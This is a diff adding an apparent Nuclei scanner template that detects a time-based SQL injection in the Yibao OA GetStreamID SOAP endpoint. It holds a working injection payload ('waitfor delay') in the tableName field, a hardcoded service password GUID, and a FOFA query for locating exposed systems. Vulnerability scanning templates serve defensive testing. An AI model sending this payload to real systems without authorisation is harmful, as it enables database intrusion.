@@ -1,0 +1,44 @@
+id: yibao-basicservice-getstreamid-sqli
+
+info:
+  name: Yibao OA GetStreamID - SQL Injection
+  author: qwtd
+  severity: high
+  description: Yibao OA System is vulnerable to SQL Injection.
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: product="顶讯科技-易宝OA系统"
+  tags: 易宝OA
+
+http:
+  - raw:
+      - |
+        POST /WebService/BasicService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetStreamID"
+        Content-Length: 85
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetStreamID xmlns="http://tempuri.org/">
+        <tableName>';waitfor delay '0:0:6'--+</tableName>
+        <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
+        </GetStreamID>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'GetStreamIDResponse'
+      - type: dsl
+        dsl:
+          - "duration>=6" # Checks if the response took more than 6 seconds
